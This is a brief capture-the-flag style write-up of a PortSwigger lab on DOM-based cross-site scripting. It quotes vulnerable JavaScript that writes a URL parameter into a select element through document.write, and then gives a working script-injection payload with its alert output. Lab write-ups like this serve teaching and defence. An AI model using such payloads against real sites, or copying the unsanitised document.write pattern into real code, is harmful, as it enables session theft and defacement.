# [Lab: DOM XSS in document.write sink using source location.search inside a select element](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)

## Lab

This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search` which you can control using the website URL. The data is enclosed within a select element.

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function.

## Analysis

Review source code at `GET /product?productId=1 HTTP/1.1`

```js
<script>
    var stores = ["London","Paris","Milan"];
    var store = (new URLSearchParams(window.location.search)).get('storeId');
    document.write('<select name="storeId">');
    if(store) {
        document.write('<option selected>'+store+'</option>');
    }
    for(var i=0;i<stores.length;i++) {
        if(stores[i] === store) {
            continue;
        }
        document.write('<option>'+stores[i]+'</option>');
    }
    document.write('</select>');
</script>
```

## Exploit

request, `'"<script>alert(1)</script>` is just a script with random `'"` at the beginning.

```http
GET /product?productId=1&storeId='"<script>alert(1)</script> HTTP/1.1
```

result:

```text
boom
alert() triggered
```
